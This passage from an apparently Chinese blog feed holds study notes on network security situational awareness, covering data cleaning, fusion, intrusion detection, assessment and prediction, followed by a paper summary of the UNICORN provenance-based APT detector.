数据清洗</h2><p>即去除源数据集中的噪声和无关数据，处理遗漏数据和清洗脏数据，除去空白数据域，通过填写缺失的值光滑噪声数据，识别或删除离群点并解决不一致性</p><ul><li>不完整数据：感兴趣的属性没有值。可采用如下方法：<ul><li>人工填充、忽略元组、用全局常量填充、用属性中间值填充、用相似样本的中间值填充、<strong>用最可能的值填充</strong></li></ul></li><li>不一致数据：数据内涵出现不一致、矛盾和不相容等情况。往往是由于重复存放的数据没有进行一致性更新。用<strong>数据集成</strong>进行处理</li><li><strong>噪声数据</strong>：存在错误或异常的数据。去除噪声的常用方法：<ul><li>分箱（Binning）：通过将有序的数据划分到对应的箱子里，减少数据规模，从而光滑数据</li><li>回归（Regression）</li><li>聚类（Clustering）</li></ul></li><li>数据清晰过程：偏差检测、数据规整</li></ul><h2 id="52-数据集成"><a class="markdownIt-Anchor" href="#52-数据集成"></a> 5.2 数据集成</h2><p>为了减少数据的不一致性和冗余，需要对数据进行集成，也就是对来自多个数据存储的数据进行合并处理、解决语义模糊性的过程，从而提供全面的数据共享。</p><p>数据集成的方法模式：</p><ul><li>联邦模式</li><li><strong>中间件模式</strong></li><li>数据仓库模式</li></ul><h2 id="53-数据归约"><a class="markdownIt-Anchor" href="#53-数据归约"></a> 5.3 数据归约</h2><p>尽可能保持数据原貌的前提下，最大限度地精简数据，属于数据融合的范畴，其大致过程为：按照数据的来源、类别、属性、时间等进行融合，形成来源明确、类别统一、属性一致、时间有序的源数据。</p><p>常用规约策略：</p><ul><li>特征规约：减少特征向量的维度</li><li>维规约：把原始数据变换或投影到较小的空间。包括小波变换、主成分分析。</li><li><strong>样本规约</strong>：从完整的数据集中选出一个有代表性的样本的子集。</li><li>数量规约：是离散化技术的一种，将具有连续型特征的值离散化，使之成为少量的区间，每个区映射到一个离散符号。<ul><li>有参数量规约：回归、对数-线性模型</li><li>无参数量规约：直方图、据类、抽样、数据立方体聚集</li></ul></li><li>数据压缩</li></ul><h2 id="54-数据变换"><a class="markdownIt-Anchor" href="#54-数据变换"></a> 5.4 数据变换</h2><p>将数据转换或统一成适合于进行分析的形式。</p><p>常见的数据变换策略：</p><ul><li>光滑：降噪</li><li>属性（特征构造）：构造新特征</li><li>聚合：对数据进行汇总和集中</li><li>标准化</li><li>离散化：将数值属性的原始值用区间标签或概念标签替换，这些标签可以递归地组织成更高层概念，导致数值属性的概念分层，对于同一个属性可以定义多个概念分层。</li><li>概念分层</li></ul><p>数据变换方法：</p><ul><li>分箱方法</li><li>直方图分析法</li><li>聚类、决策树</li><li>标准化</li><li>概念分层</li></ul><h2 id="55-数据融合"><a class="markdownIt-Anchor" href="#55-数据融合"></a> 5.5 数据融合</h2><p><strong>数据融合是态势感知的基础。</strong></p><p>按照数据抽象程度分类：</p><ul><li>数据级融合</li><li>特征级融合</li><li>决策级融合</li></ul><p>数据融合相关算法：</p><ul><li>经典方法：加权平均法、卡尔曼滤波法、贝叶斯推理、D-S证据理论</li><li>现代方法：聚类、粗糙集理论、模板法、模糊理论、人工神经网络、专家系统</li></ul><p><img src="https://img-blog.csdnimg.cn/20200319153928716.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1NjMGZpZTFk,size_16,color_FFFFFF,t_70" alt="" /><br /><img src="https://img-blog.csdnimg.cn/20200319153939222.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1NjMGZpZTFk,size_16,color_FFFFFF,t_70" alt="" /></p><h1 id="iii-态势提取"><a class="markdownIt-Anchor" href="#iii-态势提取"></a> Ⅲ 态势提取</h1><h1 id="6-网络安全检测与分析"><a class="markdownIt-Anchor" href="#6-网络安全检测与分析"></a> 6 网络安全检测与分析</h1><h2 id="61-入侵检测"><a class="markdownIt-Anchor" href="#61-入侵检测"></a> 6.1 入侵检测</h2><ul><li>入侵检测通用模型：CIDF（DRAPA），由事件产生器、事件分析器、响应单元、事件数据库</li></ul><h3 id="611-ids分类"><a class="markdownIt-Anchor" href="#611-ids分类"></a> 6.1.1 IDS分类</h3><ul><li><p>根据检测所用数据的来源不同：</p><ul><li><p>基于主机</p></li><li><p>基于网络</p></li><li><p>基于混合数据源（分布式）</p></li></ul></li><li><p>根据检测分析方法不同：</p><ul><li><p>误用检测：基于知识</p></li><li><p>异常检测：基于行为</p></li><li><p>误用和异常混合</p></li></ul></li><li><p>根据工作方式不同：</p><ul><li>实时</li><li>非实时</li><li>实际面对大流量时，单纯的实时检测不太现实，往往采用混合方式：首先实时进行初步分析，然后离线分析产生的告警。</li></ul></li><li><p>根据体系结构不同：</p><ul><li><p>集中式</p></li><li><p>分布式</p></li></ul></li><li><p>根据相应方式不同：</p><ul><li>被动响应</li><li>主动响应</li></ul></li></ul><h3 id="612-入侵检测的分析方法"><a class="markdownIt-Anchor" href="#612-入侵检测的分析方法"></a> 6.1.2 入侵检测的分析方法</h3><ul><li>误用检测</li><li>异常检测</li><li>协议分析</li></ul><p>分布式结构是趋势，可以更好地利用更先进的入侵检测算法，如免疫系统算法。</p><p>随着安全的普及，入侵检测可以打包成服务卖给家庭网络。</p><h2 id="62-入侵防御"><a class="markdownIt-Anchor" href="#62-入侵防御"></a> 6.2 入侵防御</h2><p>IPS可以提供主动防护，通过直接嵌入到网络流量中（串行部署），通过一个网络端口接收来自外部系统的流量，经过检查确认其中不包含异常活动或可疑内容之后，再通过另外一个端口将它传送到内部系统中。</p><p>IPS可以检测到2-7层的攻击，而传统防火墙只能对3、4层进行检查。</p><h3 id="621-ips分类"><a class="markdownIt-Anchor" href="#621-ips分类"></a> 6.2.1 IPS分类</h3><ul><li>基于主机</li><li>基于网络</li></ul><h2 id="63-入侵容忍"><a class="markdownIt-Anchor" href="#63-入侵容忍"></a> 6.3 入侵容忍</h2><p>入侵容忍的目的在于，再系统被部分入侵，性能下降的情况下，还能维持系统的正常服务。</p><p>实现途径：</p><ul><li>攻击响应：检测到局部系统遭受攻击之后，加快反应时间，调整系统结构，重新分配资源</li><li>攻击遮蔽：使用容错技术，使系统感觉不到小范围的攻击</li></ul><p>按照保护对象的不同：</p><ul><li>面向服务</li><li>面向数据</li></ul><p>按照功能需求不同：</p><ul><li>预防与检测</li><li>恢复与重构</li></ul><p>根据实现方法不同：</p><ul><li>基于冗余与适应性：如拜占庭法则系统</li><li>基于门限密钥共享体制</li><li>基于系统配置</li></ul><h2 id="64-安全分析"><a class="markdownIt-Anchor" href="#64-安全分析"></a> 6.4 安全分析</h2><h3 id="641-安全分析流程"><a class="markdownIt-Anchor" href="#641-安全分析流程"></a> 6.4.1 安全分析流程</h3><p>输入告警、安全分析、输出结论（事件是否发生）。常见方法如下：</p><ul><li>关联调查：适合多主机场景</li><li>鉴别诊断</li></ul><h3 id="642-数据包分析"><a class="markdownIt-Anchor" href="#642-数据包分析"></a> 6.4.2 数据包分析</h3><ul><li><p>协议分析：检验协议数据结构中的各个字段，常用于研究协议规范或者进行网络安全数据调查。</p></li><li><p>包分析：模式匹配、协议字段分析、包过滤</p></li><li><p>流分析：对一组相关的数据包序列进行分析</p><h3 id="643-计算机网络取证"><a class="markdownIt-Anchor" href="#643-计算机网络取证"></a> 6.4.3 计算机/网络取证</h3></li></ul><h3 id="644-恶意软件分析"><a class="markdownIt-Anchor" href="#644-恶意软件分析"></a> 6.4.4 恶意软件分析</h3><p>编写检测特征码用于检测恶意软件的感染范围。</p><ul><li>静态分析</li><li>动态分析</li></ul><h1 id="7-网络安全态势指标构建"><a class="markdownIt-Anchor" href="#7-网络安全态势指标构建"></a> 7 网络安全态势指标构建</h1><h2 id="71-态势属性指标的分类"><a class="markdownIt-Anchor" href="#71-态势属性指标的分类"></a> 7.1 态势属性指标的分类</h2><ul><li>定性指标与定量指标</li><li>总体指标和分类指标</li><li>描述性指标和分析性指标</li><li>效益型指标和成本型指标</li></ul><h2 id="72-不同维度的态势指标"><a class="markdownIt-Anchor" href="#72-不同维度的态势指标"></a> 7.2 不同维度的态势指标</h2><ul><li>基础运行维</li><li>脆弱维</li><li>风险维</li><li>威胁维</li></ul><h2 id="73-指标的标准化处理"><a class="markdownIt-Anchor" href="#73-指标的标准化处理"></a> 7.3 指标的标准化处理</h2><ul><li>定量指标标准化：数学变换</li><li>定性指标标准化：量化后处理</li></ul><h1 id="8-网络安全态势评估"><a class="markdownIt-Anchor" href="#8-网络安全态势评估"></a> 8 网络安全态势评估</h1><p>通过汇总、过滤、关联分析安全事件，在安全指标的基础上建立合适的数学模型，对网络系统整体安全程度进行评估。</p><p><strong>态势理解的核心是态势评估；态势评估的核心是数据融合</strong>。</p><p>态势指标权重的确定：</p><ul><li>排序归一法</li><li><strong>层次分析法</strong></li></ul><h2 id="82-态势评估方法分类"><a class="markdownIt-Anchor" href="#82-态势评估方法分类"></a> 8.2 态势评估方法分类</h2><p><img src="https://img-blog.csdnimg.cn/20200319153957969.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1NjMGZpZTFk,size_16,color_FFFFFF,t_70" alt="" /></p><h2 id="83-态势评估常用的融合方法"><a class="markdownIt-Anchor" href="#83-态势评估常用的融合方法"></a> 8.3 态势评估常用的融合方法</h2><ul><li>基于逻辑关系：告警关联</li><li>基于数学模型：加权平均法、层次分析法、模糊综合评价方法、集对分析法</li><li>基于概率统计：贝叶斯网络（需要较多先验知识、语义性）、隐马尔科夫模型</li><li>基于规则推理：基于模糊理论的逻辑推理、基于D-S证据理论的概率推理</li></ul><h1 id="9-网络安全态势可视化"><a class="markdownIt-Anchor" href="#9-网络安全态势可视化"></a> 9 网络安全态势可视化</h1><p>将过去、现在以及未来串联成一个含有上下文的故事，而这个故事必须具备真实性和关联性两个属性。</p><h2 id="91-数据可视化"><a class="markdownIt-Anchor" href="#91-数据可视化"></a> 9.1 数据可视化</h2><p>核心要素：数据的表示与变换、数据的可视化呈现、数据交互</p><h1 id="92-网络安全态势可视化"><a class="markdownIt-Anchor" href="#92-网络安全态势可视化"></a> 9.2 网络安全态势可视化</h1><ul><li>层次化数据</li><li>网络数据（图）</li><li>可视化系统交互</li><li>安全仪表盘</li></ul><h1 id="iv-态势预测"><a class="markdownIt-Anchor" href="#iv-态势预测"></a> Ⅳ 态势预测</h1><h1 id="10-态势预测"><a class="markdownIt-Anchor" href="#10-态势预测"></a> 10 态势预测</h1><h2 id="101-典型预测"><a class="markdownIt-Anchor" href="#101-典型预测"></a> 10.1 典型预测</h2><ul><li>灰色理论预测</li><li>时间序列预测</li><li>回归分析预测：属于因果关系分析</li></ul><h2 id="102-智能预测"><a class="markdownIt-Anchor" href="#102-智能预测"></a> 10.2 智能预测</h2><ul><li>神经网络</li><li>SVM</li><li>人工免疫预测：全局优化、收敛速度快<ul><li>模型机理：记忆学习、反馈机理、克隆选择机理、多样性遗传机理</li><li>相关算法：否定选择算法、克隆选择算法、免疫网络算法</li></ul></li></ul><p><strong>对于复合式攻击的预测：</strong></p><ul><li><p><strong>基于攻击行为因果关系</strong>：通过提前设定好的攻击步骤之间的前驱后继关系，根据已经检测出的攻击步骤，推测今后一段时间内该攻击者对该IP地址要继续实施的攻击步骤，以及最重要达到的目的</p></li><li><p><strong>基于贝叶斯博弈理论</strong>：提前将告警信息之间的因果关系映射到贝叶斯网络中，建立基于贝叶斯博弈的复合式攻击预测模型，再根据告警信息识别攻击者的意图并预测攻击，然后根据攻击者已经实施的攻击行为，依照贝叶斯法则不断修正攻击行为节点上的概率值，最后以上述概率值为基础分析攻击者和防御者双方的收益，预测理性的攻击者在下一个博弈阶段选择攻击的概率和防御者在下一个防御阶段选择防御的概率。</p></li><li><p><strong>基于CTPN</strong>：Colored Time Petri Net，在传统的着色Petri网中加入和逻辑时序，将时间阈值引入CPTN的变迁引发序列中</p></li><li><p><strong>基于意图</strong>：Kill-Chain</p></li><li><p>SVM</p></li><li><p>人工免疫预测：全局优化、收敛速度快</p><ul><li>模型机理：记忆学习、反馈机理、克隆选择机理、多样性遗传机理</li><li>相关算法：否定选择算法、克隆选择算法、免疫网络算法</li></ul></li></ul><p><strong>对于复合式攻击的预测：</strong></p><ul><li><strong>基于攻击行为因果关系</strong>：通过提前设定好的攻击步骤之间的前驱后继关系，根据已经检测出的攻击步骤，推测今后一段时间内该攻击者对该IP地址要继续实施的攻击步骤，以及最重要达到的目的</li><li><strong>基于贝叶斯博弈理论</strong>：提前将告警信息之间的因果关系映射到贝叶斯网络中，建立基于贝叶斯博弈的复合式攻击预测模型，再根据告警信息识别攻击者的意图并预测攻击，然后根据攻击者已经实施的攻击行为，依照贝叶斯法则不断修正攻击行为节点上的概率值，最后以上述概率值为基础分析攻击者和防御者双方的收益，预测理性的攻击者在下一个博弈阶段选择攻击的概率和防御者在下一个防御阶段选择防御的概率。</li><li><strong>基于CTPN</strong>：Colored Time Petri Net，在传统的着色Petri网中加入和逻辑时序，将时间阈值引入CPTN的变迁引发序列中</li><li><strong>基于意图</strong>：Kill-Chain</li></ul>]]></content>
      
      
      <categories>
          
          <category> 读书 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 读书 </tag>
            
            <tag> 态势感知 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PaperNote-UNICORN：基于Provenance的实时APT检测器</title>
      <link href="/2020/03/14/PaperNote-UNICORN%EF%BC%9A%E5%9F%BA%E4%BA%8EProvenance%E7%9A%84%E5%AE%9E%E6%97%B6APT%E6%A3%80%E6%B5%8B%E5%99%A8/"/>
      <url>/2020/03/14/PaperNote-UNICORN%EF%BC%9A%E5%9F%BA%E4%BA%8EProvenance%E7%9A%84%E5%AE%9E%E6%97%B6APT%E6%A3%80%E6%B5%8B%E5%99%A8/</url>
      
        <content type="html"><![CDATA[<p>原文标题：UNICORN: Runtime Provenance-Based Detector for Advanced Persistent Threats</p><p>原文作者：Xueyuan Han∗, Thomas Pasquiery, Adam Batesz, James Mickens∗ and Margo Seltzerx</p><p>原文来源：NDSS 2020</p><p>原文链接：<a href="https://arxiv.org/pdf/2001.01525.pdf" target="_blank" rel="noopener">https://arxiv.org/pdf/2001.01525.pdf</a></p><h1 id="1-摘要"><a class="markdownIt-Anchor" href="#1-摘要"></a> 1 摘要</h1><p>本文提出的<strong>UNICORN</strong>是一种<strong>基于异常</strong>的APT检测器，可以有效利用数据<strong>Provenance</strong>进行分析。</p><p>从建模到检测，UNICORN均根据APT的独有特性（low-and-slow、0-Days）进行设计。通过广泛且快速的<strong>图分析</strong>，使用<strong>graph sketching</strong>技术，UNICORN可以在长时间运行的系统中分析<strong>Provenance Graph</strong>，从而识别未知、慢速攻击。其中的Provenance graph提供了丰富的上下文和历史信息。</p><h1 id="2-简介"><a class="markdownIt-Anchor" href="#2-简介"></a> 2 简介</h1><p>对于目前的研究情况，利用恶意软件特征来检测攻击行为的方法，攻击者一旦使用0-Day漏洞，防御者便无计可施；基于系统调用和系统时间的检测方法，由于数据过于密集，使得这些方法难以对长时间的行为模式进行建模。因此，<strong>data provenance</strong>是一种检测APT更合适的数据。</p><p>但是基于provenance的APT检测方法，其难处在于，Provenance Graph的分析是相当耗费计算资源的，这是因为APT的慢速攻击，图的大小也会越来越大。目前检测系统所面临的主要问题包括：</p><ul><li>静态模型(rfr53)难以捕获长时间的系统行为</li><li>动态模型(rfr83)可能会被low-and-slow APT进行中毒攻击</li><li>在主存内进行计算的方法，应对长期运行的攻击表现不佳</li></ul><p>基于此，本文提出了UNICORN，使用graph sketching来建立一个<strong>增量更新</strong>、<strong>固定大小</strong>的<strong>纵向图数据结构</strong>。这种纵向性质允许进行广泛的图探索，使得UNICORN可以追踪隐蔽的入侵行为。而固定大小和增量更新可以避免在内存中来表示provenance graph，因此UNICORN具有可扩展性，且计算和存储开销较低。UNICORN在<strong>训练</strong>过程中直接对系统的行为进行建模，但此后不会更新模型，从而防止攻击者<strong>中毒模型</strong>。</p><p>本文的主要贡献如下：</p><ul><li>提供了专为APT攻击量身定制的、基于Provenance的异常检测系统。</li><li>介绍了一种<strong>sketch-based</strong>、<strong>time-weighted</strong>的<strong>provenance编码</strong>，从而可以简洁的概括长时间段内的provenance graph</li><li>通过模拟和真实的APT攻击来评估UNICORN</li><li><strong>开源！</strong></li></ul><h1 id="3-背景"><a class="markdownIt-Anchor" href="#3-背景"></a> 3 背景</h1><h2 id="31-追踪系统调用的挑战"><a class="markdownIt-Anchor" href="#31-追踪系统调用的挑战"></a> 3.1 追踪系统调用的挑战</h2><ul><li>捕获到的系统调用杂乱分散，因此需要将其关联成data provenance</li><li>data provenance的不可信问题：有些系统调用捕获机制可能会被绕过；race condition；TOCTTOU、TOATTOU、TORTTOU</li><li>由于一些内核线程不使用系统调用，因此基于Syscall生成的Provenance是一些分散的图，而不是一张系统运行状况的完整图</li></ul><h2 id="32-whole-system-provenance"><a class="markdownIt-Anchor" href="#32-whole-system-provenance"></a> 3.2 Whole-System Provenance</h2><p>Whole-System Provenance运行在操作系统层面，捕获所有的系统行为和它们之间的交互。通过捕获信息流和因果关系，即使攻击者通过操作内核对象来隐藏自己的行踪也无济于事。</p><p>本文使用的<strong>CamFlow</strong>，采用了Linux Security Modules（LSM）框架来确保高效可靠的信息流记录。LSM可以消除race condition。</p><h2 id="33-问题陈述和总结"><a class="markdownIt-Anchor" href="#33-问题陈述和总结"></a> 3.3 问题陈述和总结</h2><p>目前使用data provenance的一些研究，其局限性在于</p><ul><li>预定义边匹配规则，对于0-Day漏洞利用攻击无效</li><li>分析小部分的provenance graph（而非whole-system）限制了视野</li><li>系统行为模型难以检测APT：静态模型无法捕获长期运行的系统的行为；动态模型容易遭受中毒攻击</li><li>基于内存的方法，在执行长期检测上有局限性</li></ul><p>于是，UNICORN将系统范围内的APT入侵检测问题，形式化为一个whole-system provenance graph中的实时异常检测问题。首先建立一个已知良性的provenance graph模型，然后再任何时间点，都将从系统开始启动到目前为止所产生的整个的provenance graph与良性模型进行比较，如果偏离了该模型，那么就认为发生了攻击。（典型的abnormal-based）</p><p>对于APT检测来说，理想的provenance-based IDS必须满足：</p><ul><li><p>连续、高效地分析provenance graph，同时充分利用整个系统provenance graph提供的丰富信息内容</p></li><li><p>在不假设攻击行为的情况下，应考虑系统执行的整个持续时间</p></li><li><p>仅学习正常的系统行为，而不学习攻击者的行为</p></li></ul><h1 id="4-威胁模型"><a class="markdownIt-Anchor" href="#4-威胁模型"></a> 4 威胁模型</h1><p>UNICORN的任务是在任何阶段检测到APT攻击。我们假设在受到攻击之前，UNICORN在正常运行期间会完全观察主机系统，并且在此初始建模期间不会发生攻击。</p><p>数据收集框架的完整性是UNICORN正确性的核心，因此我们假定所使用的CamFlow中，LSM完整性是可信的</p><h1 id="5-设计"><a class="markdownIt-Anchor" href="#5-设计"></a> 5 设计</h1><p><img src="https://img-blog.csdnimg.cn/20200314214143558.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1NjMGZpZTFk,size_16,color_FFFFFF,t_70" alt="UNICORN's general pipeline" /></p><ul><li>以带<strong>标签</strong>的、基于流的provenance graph作为输入（<strong>CamFlow</strong>）：该图由CamFlow生成，每条边是带属性的，整个图是单张、whole-system的偏序DAG</li><li>在运行时构建<strong>内存直方图</strong>（in-memory histogram）：<strong>表示系统执行的整个历史</strong>。</li></ul><p>当有新边到达图中时，就更新直方图元素的计数；通过迭代探索越来越大范围的邻居，可以发现系统实体之间的因果关系，进而提供执行的上下文信息。特别地，直方图中的每个元素描述了provenance graph的一个子结构，同时考虑到子结构内<strong>顶点和边的异质性标签</strong>以及这些<strong>边的时间顺序</strong>。</p><p>缓慢遗忘无关的过去事件，使得系统可以高效地对<strong>meta-state</strong>进行建模。</p><ul><li>定期计算固定大小的简略图（graph sketch）</li><li>将简略图聚类为模型</li></ul><h2 id="51-provenance-graph"><a class="markdownIt-Anchor" href="#51-provenance-graph"></a> 5.1 Provenance Graph</h2><p>Provenance中包含了事件之间的因果关系。但使用provenance进行分析的难点在于：如何高效地比对两个图之间的相似度（<strong>graph similarity measure</strong>）。</p><h2 id="52-构造graph直方图"><a class="markdownIt-Anchor" href="#52-构造graph直方图"></a> 5.2 构造Graph直方图</h2><p>我们的目标是有效地<strong>比较provenance graph</strong>，同时容忍正常执行中的微小变化。 对于算法，我们有两个标准：</p><ul><li>表示应考虑<strong>长期</strong>的因果关系</li><li>必须能够在<strong>实时</strong>流图数据上实现该算法，以便我们能够在入侵发生时阻止入侵（不仅仅是检测到入侵）。</li></ul><p>本文基于同构的一维WL测试，采用了线性时间的、快速的<strong>Weisfeiler-Lehman</strong>（<strong>WL</strong>）<strong>subtree graph kernel</strong>算法。同构性的WL测试及其子树kernel变化，以其对多种图的判别能力而闻名，超越了许多最新的图学习算法（例如，图神经网络）。</p><p>对<strong>Weisfeiler-Lehman</strong>（<strong>WL</strong>）<strong>subtree graph kernel</strong>的使用取决于我们构建顶点直方图的能力，<strong>捕获围绕每个顶点的图结构</strong>。 我们<strong>根据增强顶点标签对顶点进行分类</strong>（<strong>augmented vertex labels</strong>），标签描述了顶点的R-hop邻居。</p><p>通过<strong>迭代标签传播</strong>来构建这些<strong>增强顶点标签</strong>：</p><ul><li>假设现在有一个完全静态的图，单个relabel步骤将 1）一个顶点的标签、2）所有传入该顶点的边的边的标签、3）所有这些边的源顶点的标签 作为输入；然后为这个顶点输出一个新的标签，表示所有输入标签的聚合。</li><li>我们对每个顶点重复此过程，然后重复整个过程R次以构造描述R-hop邻居的标签。</li><li>一旦为图中的每个顶点构造了增强的顶点标签，我们就创建一个直方图，其buckets对应于这些标签。</li><li>同构性的WL测试基于这些增强顶点标签，比较两个图，如果两个图在相似的标签集上具有相似的分布，则它们是相似的。</li></ul><p>下面是该算法的形式化描述：</p><p><img src="https://img-blog.csdnimg.cn/20200314214316686.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1NjMGZpZTFk,size_16,color_FFFFFF,t_70" alt="Graph Histogram Generation" /></p><p>我们的目标是构建一个直方图，图中的每个元素对应一个唯一的顶点标签，用于捕获顶点的R-hop的in-coming邻居。</p><h3 id="521-streaming-variant-and-complexity"><a class="markdownIt-Anchor" href="#521-streaming-variant-and-complexity"></a> 5.2.1 Streaming Variant and Complexity</h3><p>上面的算法仅在<strong>新到达的顶点</strong>，或<strong>在那些邻居被新到达的边所影响的顶点</strong>上运行。</p><p><img src="https://img-blog.csdnimg.cn/20200314214339273.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1NjMGZpZTFk,size_16,color_FFFFFF,t_70" alt="" /></p><h3 id="522-由于概念漂移而忽视直方图中的元素"><a class="markdownIt-Anchor" href="#522-由于概念漂移而忽视直方图中的元素"></a> 5.2.2 由于概念漂移而忽视直方图中的元素</h3><p>系统行为经常会随着时间变化，会导致streaming provenance graph的基础统计属性发生变化，这种现象我们称之为<strong>概念漂移</strong>（concept drift）。</p><p><strong>逐渐忘记机制</strong>：UNICORN通过对直方图元素计数使用<strong>指数权重衰减</strong>来逐渐<strong>消除过时的数据</strong>，从而解决了系统行为中的此类变化。 它分配的权重与数据的年龄成反比。</p><p><span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mi>x</mi><mi>t</mi></msub></mrow><annotation encoding="application/x-tex">x_t</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.58056em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.2805559999999999em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">t</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>即为Algorithm.1中23行的<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mi>l</mi><mi>i</mi></msub><mo stretchy="false">(</mo><mi>v</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">l_i(v)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.01968em;">l</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:-0.01968em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathdefault" style="margin-right:0.03588em;">v</span><span class="mclose">)</span></span></span></span>，当t时刻新的数据条目<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mi>x</mi><mi>t</mi></msub></mrow><annotation encoding="application/x-tex">x_t</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.58056em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.2805559999999999em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">t</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>出现时，采用下面的计数方式，其中<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mi>w</mi><mi>t</mi></msub><mo>=</mo><msup><mi>e</mi><mrow><mo>−</mo><mi>λ</mi><mi mathvariant="normal">∆</mi><mi>t</mi></mrow></msup></mrow><annotation encoding="application/x-tex">w_t = e^{-λ∆t}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.58056em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.02691em;">w</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.2805559999999999em;"><span style="top:-2.5500000000000003em;margin-left:-0.02691em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">t</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.8491079999999999em;vertical-align:0em;"></span><span class="mord"><span class="mord mathdefault">e</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8491079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">−</span><span class="mord mathdefault mtight">λ</span><span class="mord mtight">∆</span><span class="mord mathdefault mtight">t</span></span></span></span></span></span></span></span></span></span></span></span></p><p><img src="https://img-blog.csdnimg.cn/202003142143536.png" alt="" /></p><p>上述“逐渐忘记”的方法，使得UNICORN可以着眼于当前的系统执行动态，而且那些与当先的object/activity有关系的事件不会被忘记。</p><h2 id="53-生成简略图graph-sketches"><a class="markdownIt-Anchor" href="#53-生成简略图graph-sketches"></a> 5.3 生成简略图（Graph Sketches）</h2><p>直方图是描述系统执行的简单向量空间图统计量。 但是，与传统的基于直方图的相似性分析不同，UNICORN会随着新边缘的到来不断更新直方图。</p><p>本文采用<strong>locality sensitive hashing</strong>，也称作<strong>similarity-preserving data sketching</strong>。UNICORN的部署采用了前人的研究成果<strong>HistoSketch</strong>.</p><h2 id="54-学习进化模型"><a class="markdownIt-Anchor" href="#54-学习进化模型"></a> 5.4 学习进化模型</h2><p>在给定graph sketch和相似性度量的情况下，聚类是检测离群点常用的数据挖掘手段。然而传统的聚类方法无法捕获系统不断发展的行为。UNICORN利用其流处理的能力，创建了进化模型，可以捕获系统正常行为的变化。更重要的是，模型的建立是在<strong>训练阶段</strong>完成的，而不是在<strong>部署阶段</strong>，因为部署阶段训练模型可能会遭受中毒攻击。</p><p>UNICORN在训练期间创建一系列按时间顺序排列的sketches，然后从一个单独的服务器上，使用<strong>K-medoids</strong>算法将这些sketch序列进行聚类，使用<strong>轮廓系数</strong>（silhouette coefficient）来确定最优的K值。<strong>每个簇表示系统执行的元状态</strong>（meta-states），如启动、初始化、稳定状态。然后UNICORN使用所有簇中sketches的时间顺序和每个簇的统计量（如直径、medoid），来生成系统进化的模型。</p><p><img src="https://img-blog.csdnimg.cn/20200314214405552.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1NjMGZpZTFk,size_16,color_FFFFFF,t_70" alt="Generating an Evolution Trace" /></p><h2 id="55-异常检测"><a class="markdownIt-Anchor" href="#55-异常检测"></a> 5.5 异常检测</h2><p>UNICORN周期性的创建graph 